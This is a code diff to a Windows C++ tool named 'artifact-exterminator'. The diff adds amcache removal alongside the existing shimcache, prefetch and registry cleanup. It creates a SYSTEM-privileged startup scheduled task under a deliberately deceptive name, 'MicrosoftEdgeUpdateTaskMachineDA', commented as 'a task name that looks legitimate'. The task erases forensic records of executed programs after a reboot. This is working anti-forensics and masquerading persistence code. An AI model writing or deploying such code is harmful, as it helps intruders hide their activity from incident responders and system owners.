@@ -34,14 +34,15 @@
 	  If any part of the argument contains a space, it should be wrapped in quotes.
  *    e.g. HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache\AppCompatCache
  * -a Additional file paths to clean up
- * -s Only run shimcache removal function. The value of this option is not relevant, but is still required.
+ * -s Running as scheduled task. The value of this option is not relevant, but is still required.
  *    e.g. artifact-exterminator.exe -f C:\Windows\System32\executable.exe -s 1
- *    The user should almost never have to use this argument. This is mainly used when scheduling a task to clear the shimcache.
+ *    The user should almost never have to use this argument. This is mainly used on features which require scheduled task to complete.
  * --features Specify features to run, comma-separated. If this argument is not provided, all features are ran by default.
  *            Possible values:
  *            registry
  *            shimcache
  *            prefetch
+ *            amcache
  */
 int wmain(int argc, wchar_t* argv[])
 {
@@ -64,11 +65,11 @@ int wmain(int argc, wchar_t* argv[])
     wchar_t killSwitchPollIntervalStr[10] = { 0 };
     wchar_t registryKeysToRemoveStr[1024] = { 0 };
     wchar_t registryValuesToRemoveStr[1024] = { 0 };
-    wchar_t runOnlyShimcacheRemoval[2] = { 0 };
+    wchar_t scheduledTaskRunning[2] = { 0 };
     wchar_t additionalExecutableNames[1024] = { 0 };
 
     getCommandLineValue(argc, argv, L"-a", additionalExecutableNames, 1024);
-    getCommandLineValue(argc, argv, L"-s", runOnlyShimcacheRemoval, 2);
+    getCommandLineValue(argc, argv, L"-s", scheduledTaskRunning, 2);
     getCommandLineValue(argc, argv, L"-f", executableFilePath, MAX_PATH);
     getCommandLineValue(argc, argv, L"--args", commandArgs, 512);
 
@@ -103,7 +104,7 @@ int wmain(int argc, wchar_t* argv[])
         features,
         registryKeysToRemoveStr,
         registryValuesToRemoveStr,
-        runOnlyShimcacheRemoval,
+        scheduledTaskRunning,
         additionalExecutableNames,
         killSwitchIP,
         killSwitchPort,
@@ -241,6 +242,10 @@ int wmain(int argc, wchar_t* argv[])
     if(shimcacheFeatureEnabled)
 		scheduleShimcacheTask(executableNames);
 
+    // FEAT: Schedule task to perform amcache cleanup upon system reboot
+    if (amcacheFeatureEnabled)
+        scheduleAmcacheTask(executableNames);
+
     // FEAT: Backup registry
     if(registryFeatureEnabled)
 		backupRegistry(registryBackupFolderPath);
@@ -287,7 +292,7 @@ int wmain(int argc, wchar_t* argv[])
     }
 
     // Remove shimcache records of specified executable names
-    if (shimcacheFeatureEnabled && runOnlyShimcacheRemoval)
+    if (shimcacheFeatureEnabled && scheduledTaskRunning)
     {
         // For each executable name, remove shimcache record.
         for(int i = 0; i < 100; i++)
@@ -314,7 +319,8 @@ int wmain(int argc, wchar_t* argv[])
         }
     }
 
-    if (amcacheFeatureEnabled)
+    // Remove amcache records of specified executable names
+    if (amcacheFeatureEnabled && scheduledTaskRunning)
     {
         for(int i = 0; i < 100; i++)
         {
@@ -356,6 +362,35 @@ void scheduleShimcacheTask(wchar_t* executableNames)
         command,
         512,
         L"/c SCHTASKS /Create /F /RU SYSTEM /SC ONSTART /TN %s /TR \"%s -s 1 --features shimcache -a %s\"",
+        taskName,
+        filePath,
+        executableNames);
+    wprintf(L"[DEBUG] Task creation command:\n%s\n", command);
+
+    STARTUPINFOW si;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&pi, sizeof(pi));
+    CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", command, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
+    WaitForSingleObject(pi.hProcess, 10000);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+}
+
+void scheduleAmcacheTask(wchar_t* executableNames)
+{
+    wchar_t filePath[MAX_PATH];
+    GetModuleFileNameW(NULL, filePath, MAX_PATH);
+
+    // A task name that looks legitimate
+    const wchar_t* taskName = L"MicrosoftEdgeUpdateTaskMachineDA";
+
+    wchar_t command[512];
+    _snwprintf_s(
+        command,
+        512,
+        L"/c SCHTASKS /Create /F /RU SYSTEM /SC ONSTART /TN %s /TR \"%s -s 1 --features amcache -a %s\"",
         taskName,
         filePath,
         executableNames);
